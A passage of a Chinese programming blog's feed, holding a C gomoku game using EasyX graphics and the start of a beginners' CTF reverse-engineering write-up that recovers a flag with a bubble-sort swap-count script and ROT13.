class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;conio.h&gt;</span><br><span class="line">#include &lt;graphics.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;**************************************************************&#x2F;</span><br><span class="line">void init_system();               &#x2F;&#x2F;初始化系统</span><br><span class="line">void close_system();               &#x2F;&#x2F;关闭系统</span><br><span class="line">void init_game();                  &#x2F;&#x2F;初始化游戏界面</span><br><span class="line"></span><br><span class="line">void m_white();                    &#x2F;&#x2F;白棋</span><br><span class="line">void m_black();                    &#x2F;&#x2F;黑棋</span><br><span class="line"></span><br><span class="line">void m_play();                     &#x2F;&#x2F;下棋</span><br><span class="line">int  m_win();                      &#x2F;&#x2F;判断胜负</span><br><span class="line"></span><br><span class="line">void m_replay();                   &#x2F;&#x2F;重玩</span><br><span class="line"></span><br><span class="line">&#x2F;**************************************************************&#x2F;</span><br><span class="line">int m_bine[22][22] ;               &#x2F;&#x2F;定义棋子数组</span><br><span class="line">int m_w &#x3D; 15,m_h &#x3D; 15,m_wh &#x3D; 25;   &#x2F;&#x2F;定义行列数，每格像素数</span><br><span class="line">int m_x0 &#x3D; 25,m_y0 &#x3D; 25;           &#x2F;&#x2F;初始棋子位置</span><br><span class="line">int m_x9 &#x3D; 375,m_y9 &#x3D; 375;         &#x2F;&#x2F;最终棋子位置</span><br><span class="line">int flag;</span><br><span class="line"></span><br><span class="line">&#x2F;**************************************************************&#x2F;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    init_system();</span><br><span class="line"></span><br><span class="line">    m_play();</span><br><span class="line"></span><br><span class="line">    close_system();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*************************************************************&#x2F;</span><br><span class="line">void init_system()  &#x2F;&#x2F;初始化系统</span><br><span class="line">&#123;</span><br><span class="line">    init_game();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_game()    &#x2F;&#x2F;初始化游戏界面</span><br><span class="line">&#123;</span><br><span class="line">    IMAGE img;</span><br><span class="line">    loadimage(&amp;img, &quot;test.jpg&quot;);&#x2F;&#x2F;导入test图片用作棋盘</span><br><span class="line">    int w, h;</span><br><span class="line">    w &#x3D; img.getwidth();</span><br><span class="line">    h &#x3D; img.getheight();</span><br><span class="line">    initgraph(w+150,h);</span><br><span class="line">    putimage( 0, 0, &amp;img);</span><br><span class="line"></span><br><span class="line">    setlinecolor(WHITE);</span><br><span class="line">    setfillcolor(BLACK);</span><br><span class="line">    fillrectangle(w, 0, w+130, 60);</span><br><span class="line">    settextstyle(20,0,&quot;楷体&quot;);</span><br><span class="line">    outtextxy(w+10,5 ,&quot;黑方:玩家一&quot;);</span><br><span class="line">    outtextxy(w+10,30 ,&quot;白方:玩家二&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void close_system()  &#x2F;&#x2F;关闭系统</span><br><span class="line">&#123;</span><br><span class="line">    closegraph();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*********************************************&#x2F;</span><br><span class="line">void m_white()  &#x2F;&#x2F;将画笔变为白色</span><br><span class="line">&#123;</span><br><span class="line">    setlinecolor(WHITE);</span><br><span class="line">    setfillcolor(WHITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void m_black()  &#x2F;&#x2F;将画笔变为黑色</span><br><span class="line">&#123;</span><br><span class="line">    setlinecolor(BLACK);</span><br><span class="line">    setfillcolor(BLACK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;**********************************************&#x2F;</span><br><span class="line">void m_play()  &#x2F;&#x2F;下棋</span><br><span class="line">&#123;</span><br><span class="line">    MOUSEMSG m_mouse;</span><br><span class="line">    int i,j;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        flag &#x3D; 0;</span><br><span class="line">        m_mouse &#x3D; GetMouseMsg();</span><br><span class="line">        switch(m_mouse.uMsg)</span><br><span class="line">        &#123;</span><br><span class="line">            int a,b;</span><br><span class="line">            case WM_LBUTTONDOWN:  &#x2F;&#x2F;左键下黑棋</span><br><span class="line">               &#123;</span><br><span class="line">                    if(m_mouse.x &gt; m_x0-m_wh&#x2F;2 &amp;&amp; m_mouse.x &lt; m_x9+m_wh&#x2F;2&amp;&amp;</span><br><span class="line">                     m_mouse.y &gt; m_y0-m_wh&#x2F;2 &amp;&amp; m_mouse.y &lt; m_y9+m_wh&#x2F;2)  &#x2F;&#x2F;判断是否在棋盘内</span><br><span class="line">                  &#123;</span><br><span class="line">                      for(i &#x3D; 0 ; i &lt;&#x3D; 15 ; i++)</span><br><span class="line">                      &#123;</span><br><span class="line">                          for(j &#x3D; 0 ; j &lt;&#x3D; 15 ; j++)</span><br><span class="line">                          &#123;</span><br><span class="line">                              if(m_mouse.x &gt;&#x3D; m_x0-m_wh&#x2F;2   +i*m_wh &amp;&amp;</span><br><span class="line">                                 m_mouse.x &lt;&#x3D; m_x0+m_wh&#x2F;2   +i*m_wh &amp;&amp;</span><br><span class="line">                                 m_mouse.y &gt;&#x3D; m_y0-m_wh&#x2F;2   +j*m_wh &amp;&amp;</span><br><span class="line">                                 m_mouse.y &lt;&#x3D; m_y0+m_wh&#x2F;2   +j*m_wh)      &#x2F;&#x2F;纠正棋子位置，使其落在两线交叉点</span><br><span class="line">                              &#123;</span><br><span class="line">                                  a &#x3D; i + 1;</span><br><span class="line">                                  b &#x3D; j + 1;</span><br><span class="line">                                  m_mouse.x &#x3D; a*m_wh;</span><br><span class="line">                                  m_mouse.y &#x3D; b*m_wh;</span><br><span class="line">                                  break;</span><br><span class="line">                              &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125;                  </span><br><span class="line">                      if(m_bine[a][b] !&#x3D; 0)  &#x2F;&#x2F;如果此处有棋子则不能下棋</span><br><span class="line">                        continue;</span><br><span class="line">                      m_bine[a][b] &#x3D; 1;</span><br><span class="line">                      m_black();</span><br><span class="line">                      fillcircle(m_mouse.x,m_mouse.y,10);</span><br><span class="line">                  &#125;</span><br><span class="line">                  flag &#x3D; m_win();</span><br><span class="line">                  if(flag &#x3D;&#x3D; 1)  &#x2F;&#x2F;判断是否胜利</span><br><span class="line">                  &#123;</span><br><span class="line">                      outtextxy(400,250 ,&quot;按任意键&quot;);</span><br><span class="line">                      outtextxy(400,270 ,&quot;再来一盘&quot;);</span><br><span class="line">                      getch();</span><br><span class="line">                      m_replay();</span><br><span class="line">                  &#125;</span><br><span class="line">                  else</span><br><span class="line">                    m_win();</span><br><span class="line">               &#125;</span><br><span class="line">              break;</span><br><span class="line">            case WM_RBUTTONDOWN :   &#x2F;&#x2F;右键下白棋</span><br><span class="line">               &#123;</span><br><span class="line">                    if(m_mouse.x &gt; m_x0-m_wh&#x2F;2 &amp;&amp; m_mouse.x &lt; m_x9+m_wh&#x2F;2&amp;&amp;</span><br><span class="line">                     m_mouse.y &gt; m_y0-m_wh&#x2F;2 &amp;&amp; m_mouse.y &lt; m_y9+m_wh&#x2F;2)  &#x2F;&#x2F;判断是否在棋盘内</span><br><span class="line">                  &#123;</span><br><span class="line">                      for(i &#x3D; 0 ; i &lt;&#x3D; 15 ; i++)</span><br><span class="line">                      &#123;</span><br><span class="line">                          for(j &#x3D; 0 ; j &lt;&#x3D; 15 ; j++)</span><br><span class="line">                          &#123;</span><br><span class="line">                              if(m_mouse.x &gt;&#x3D; m_x0-m_wh&#x2F;2   +i*m_wh &amp;&amp;</span><br><span class="line">                                 m_mouse.x &lt;&#x3D; m_x0+m_wh&#x2F;2   +i*m_wh &amp;&amp;</span><br><span class="line">                                 m_mouse.y &gt;&#x3D; m_y0-m_wh&#x2F;2   +j*m_wh &amp;&amp;</span><br><span class="line">                                 m_mouse.y &lt;&#x3D; m_y0+m_wh&#x2F;2   +j*m_wh)      &#x2F;&#x2F;纠正棋子位置，使其落在两线交叉点</span><br><span class="line">                              &#123;</span><br><span class="line">                                  a &#x3D; i + 1;</span><br><span class="line">                                  b &#x3D; j + 1;</span><br><span class="line">                                  m_mouse.x &#x3D; a*m_wh;</span><br><span class="line">                                  m_mouse.y &#x3D; b*m_wh;</span><br><span class="line">                                  break;</span><br><span class="line">                              &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                      if(m_bine[a][b] !&#x3D; 0)  &#x2F;&#x2F;如果此处有棋子则不能下棋</span><br><span class="line">                        continue;</span><br><span class="line">                      m_bine[a][b] &#x3D; 2;</span><br><span class="line">                      m_white();</span><br><span class="line">                      fillcircle(m_mouse.x,m_mouse.y,10);</span><br><span class="line">                  &#125;</span><br><span class="line">                  flag &#x3D; m_win();</span><br><span class="line">                  if(m_win() &#x3D;&#x3D; 1)  &#x2F;&#x2F;判断是否胜利</span><br><span class="line">                  &#123;</span><br><span class="line">                      outtextxy(400,250 ,&quot;按任意键&quot;);</span><br><span class="line">                      outtextxy(400,270 ,&quot;再来一盘&quot;);</span><br><span class="line">                      getch();</span><br><span class="line">                      m_replay();</span><br><span class="line">                  &#125;</span><br><span class="line">                  else</span><br><span class="line">                    m_win();</span><br><span class="line">               &#125;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void m_replay()&#x2F;&#x2F;重新游戏</span><br><span class="line">&#123;</span><br><span class="line">    memset(m_bine,0,sizeof(m_bine));&#x2F;&#x2F;初始化数组</span><br><span class="line">    init_game();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int m_win()  &#x2F;&#x2F;判断是否胜利</span><br><span class="line">&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i &#x3D; 1 ; i &lt;&#x3D; 15 ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 1 ; j &lt;&#x3D; 15 ; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(m_bine[i][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+1][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+2][j] &#x3D;&#x3D; 1 &amp;&amp;</span><br><span class="line">                   m_bine[i+3][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+4][j] &#x3D;&#x3D; 1)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400,200 ,&quot;the black win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(m_bine[i][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+1][j+1] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+2][j+2] &#x3D;&#x3D; 1 &amp;&amp;</span><br><span class="line">                        m_bine[i+3][j+3] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+4][j+4] &#x3D;&#x3D; 1)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200 ,&quot;the black win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(m_bine[i][j+1] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i][j+2] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i][j+3] &#x3D;&#x3D; 1 &amp;&amp;</span><br><span class="line">                        m_bine[i][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i][j+4] &#x3D;&#x3D; 1)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200,&quot;the black win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;        </span><br><span class="line">                else if(i &gt;&#x3D; 3 &amp;&amp; m_bine[i][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+1][j-1] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+2][j-2] &#x3D;&#x3D; 1 &amp;&amp;</span><br><span class="line">                        m_bine[i+3][j-3] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+4][j-4] &#x3D;&#x3D; 1)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200 ,&quot;the black win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(j &gt;&#x3D; 3 &amp;&amp; m_bine[i][j] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+1][j-1] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+2][j-2] &#x3D;&#x3D; 1 &amp;&amp;</span><br><span class="line">                        m_bine[i+3][j-3] &#x3D;&#x3D; 1 &amp;&amp; m_bine[i+4][j-4] &#x3D;&#x3D; 1)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200 ,&quot;the black win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(m_bine[i][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+1][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+2][j] &#x3D;&#x3D; 2 &amp;&amp;</span><br><span class="line">                        m_bine[i+3][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+4][j] &#x3D;&#x3D; 2)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400,200 ,&quot;the  white win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(m_bine[i][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+1][j+1] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+2][j+2] &#x3D;&#x3D; 2 &amp;&amp; </span><br><span class="line">                        m_bine[i+3][j+3] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+4][j+4] &#x3D;&#x3D; 2)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200 ,&quot;the white win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(m_bine[i][j+1] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i][j+2] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i][j+3] &#x3D;&#x3D; 2 &amp;&amp; </span><br><span class="line">                        m_bine[i][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i][j+4] &#x3D;&#x3D; 2)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200,&quot;the white win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;    </span><br><span class="line">                else if(i &gt;&#x3D; 3 &amp;&amp; j &gt; 3 &amp;&amp; m_bine[i][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+1][j-1] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+2][j-2] &#x3D;&#x3D; 2 &amp;&amp; </span><br><span class="line">                        m_bine[i+3][j-3] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+4][j-4] &#x3D;&#x3D; 2)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200 ,&quot;the white win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(j &gt;&#x3D; 3 &amp;&amp; m_bine[i][j] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+1][j-1] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+2][j-2] &#x3D;&#x3D; 2 &amp;&amp; </span><br><span class="line">                        m_bine[i+3][j-3] &#x3D;&#x3D; 2 &amp;&amp; m_bine[i+4][j-4] &#x3D;&#x3D; 2)</span><br><span class="line">                &#123;</span><br><span class="line">                    settextcolor(WHITE);</span><br><span class="line">                    outtextxy(400 ,200 ,&quot;the white win&quot;);</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程开发 </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021.6.1萌新赛 re wp</title>
      <link href="2021/06/05/2021.6.1%E8%90%8C%E6%96%B0%E8%B5%9B%20re%20wp/"/>
      <url>2021/06/05/2021.6.1%E8%90%8C%E6%96%B0%E8%B5%9B%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-6-1萌新赛-re-wp"><a href="#2021-6-1萌新赛-re-wp" class="headerlink" title="2021.6.1萌新赛 re wp"></a>2021.6.1萌新赛 re wp</h1><p>比赛做了两道，剩下有道sm4加密，只不过要去平坦化控制流，本来以前做xctf环境都搭好了，可以用deflat.py去，结果现在又用不了了。。。。难受，还有两道apk题，确实apk做得少，不当做得来。</p><h2 id="re-signin"><a href="#re-signin" class="headerlink" title="re_signin"></a>re_signin</h2><p>中午放学回来做起得，还没放hint，后来放了hint，难度直接下降。</p><p>还是pyc先转py，然后看逻辑<br><img src="https://i.loli.net/2021/06/04/dwInfkFTDH9BCy5.png"><br>实际上后面还有个位移量为13的凯撒</p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void BubbleSort(int a[], int len)</span><br><span class="line">&#123;</span><br><span class="line">int i, j, temp,n&#x3D;0;</span><br><span class="line">for (j &#x3D; 0; j &lt; len - 1; j++)</span><br><span class="line">&#123;</span><br><span class="line">for (i &#x3D; 0; i &lt; len - 1 - j; i++)</span><br><span class="line">if (a[i] &gt; a[i + 1])</span><br><span class="line">&#123;</span><br><span class="line">temp &#x3D; a[i];</span><br><span class="line">a[i] &#x3D; a[i + 1];</span><br><span class="line">a[i + 1] &#x3D; temp;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%c&quot;,n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int arr[24][22] &#x3D; &#123;&#123;73, 69, 60, 20, 64, 68, 99, 4, 36, 9, 91, 42, 75, 43, 8, 77, 55, 70, 84, 37, 3, 93&#125;,</span><br><span class="line">&#123;85, 46, 47, 99, 58, 35, 83, 3, 57, 18, 52, 17, 97, 16, 6, 51, 84, 62, 1, 41, 88, 87&#125;,</span><br><span class="line">&#123;97, 34, 31, 80, 19, 57, 10, 84, 4, 50, 43, 63, 65, 88, 30, 72, 21, 36, 27, 41, 86, 79&#125;,</span><br><span class="line">&#123;31, 23, 68, 67, 30, 47, 27, 40, 73, 63, 11, 89, 18, 5, 9, 74, 88, 38, 8, 20, 50, 83&#125;,</span><br><span class="line">&#123;88, 5, 85, 82, 36, 74, 6, 15, 40, 55, 95, 8, 84, 47, 96, 33, 25, 29, 77, 67, 26, 39&#125;,</span><br><span class="line">&#123;54, 53, 0, 37, 66, 91, 39, 38, 57, 6, 47, 28, 49, 92, 29, 85, 88, 84, 90, 13, 35, 52&#125;,</span><br><span class="line">&#123;80, 18, 26, 91, 10, 52, 11, 99, 85, 75, 60, 48, 36, 74, 55, 51, 86, 49, 89, 29, 82, 16&#125;,</span><br><span class="line">&#123;35, 70, 42, 44, 18, 65, 84, 71, 26, 14, 38, 28, 21, 86, 20, 54, 30, 11, 66, 10, 69, 77&#125;,</span><br><span class="line">&#123;71, 25, 43, 23, 29, 6, 33, 44, 5, 30, 32, 18, 47, 13, 76, 8, 83, 87, 57, 26, 16, 19&#125;,</span><br><span class="line">&#123;29, 51, 7, 62, 94, 32, 57, 1, 71, 84, 92, 16, 18, 19, 56, 52, 40, 80, 98, 44, 82, 33&#125;,</span><br><span class="line">&#123;67, 14, 93, 91, 78, 80, 7, 37, 10, 82, 38, 83, 23, 27, 17, 76, 74, 18, 66, 24, 99, 43&#125;,</span><br><span class="line">&#123;29, 56, 44, 54, 70, 31, 10, 38, 8, 85, 18, 22, 32, 49, 2, 21, 50, 5, 25, 48, 90, 84&#125;,</span><br><span class="line">&#123;23, 33, 90, 7, 42, 71, 25, 58, 5, 47, 54, 18, 97, 72, 2, 1, 68, 64, 76, 85, 69, 49&#125;,</span><br><span class="line">&#123;77, 67, 52, 31, 35, 6, 56, 94, 81, 23, 78, 50, 15, 10, 28, 69, 43, 91, 82, 72, 99, 38&#125;,</span><br><span class="line">&#123;20, 47, 52, 27, 73, 64, 9, 62, 3, 57, 2, 97, 44, 35, 89, 10, 18, 29, 58, 56, 74, 84&#125;,</span><br><span class="line">&#123;66, 11, 76, 91, 70, 9, 6, 75, 32, 71, 44, 48, 88, 20, 98, 97, 79, 63, 47, 78, 60, 81&#125;,</span><br><span class="line">&#123;43, 13, 70, 23, 31, 69, 52, 30, 2, 78, 0, 37, 73, 93, 18, 1, 51, 62, 25, 68, 65, 87&#125;,</span><br><span class="line">&#123;24, 86, 29, 0, 93, 51, 53, 47, 16, 40, 94, 98, 88, 64, 41, 83, 44, 35, 45, 75, 17, 46&#125;,</span><br><span class="line">&#123;33, 12, 63, 77, 25, 24, 47, 58, 6, 89, 97, 27, 21, 96, 92, 50, 82, 76, 5, 62, 56, 44&#125;,</span><br><span class="line">&#123;12, 36, 16, 44, 19, 62, 43, 80, 58, 98, 69, 97, 1, 7, 49, 26, 70, 34, 53, 13, 65, 48&#125;,</span><br><span class="line">&#123;51, 74, 76, 98, 33, 78, 44, 45, 4, 65, 99, 84, 80, 93, 37, 56, 77, 9, 6, 94, 52, 88&#125;,</span><br><span class="line">&#123;80, 38, 88, 66, 7, 40, 70, 24, 2, 12, 76, 18, 57, 73, 58, 83, 33, 17, 89, 69, 77, 67&#125;,</span><br><span class="line">&#123;18, 53, 14, 24, 94, 42, 61, 75, 62, 60, 73, 2, 65, 48, 80, 23, 44, 91, 7, 0, 31, 71&#125;,</span><br><span class="line">&#123;16, 54, 87, 75, 8, 23, 33, 56, 22, 63, 1, 2, 25, 6, 84, 80, 4, 49, 17, 42, 14, 43&#125;&#125;;</span><br><span class="line">int i &#x3D; 0;</span><br><span class="line"></span><br><span class="line"> for(i&#x3D;0;i&lt;24;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> BubbleSort(&amp;arr[i][0], 22);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;synt&#123;jrypbzr_gb_arjfpgs&#125;</span><br></pre></td></tr></table></figure><p>然后凯撒位移13，得到<code>flag&#123;welcome_to_newsctf&#125;</code></p><h2 id="1-1的签到题"><a href="#1-1的签到题" class="headerlink" title="1+1的签到题"></a>1+1的签到题</h2><p>考点，upx脱壳，伪随机数，变表base64，变表base58</p><p>先看伪随机数，系统不同产生的随机数也会不一样，这里我为了方便，直接就动调得到的随机数。<br><img src="https://i.loli.net/2021/06/04/fVl2IvOghPkEF7q.png"></p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 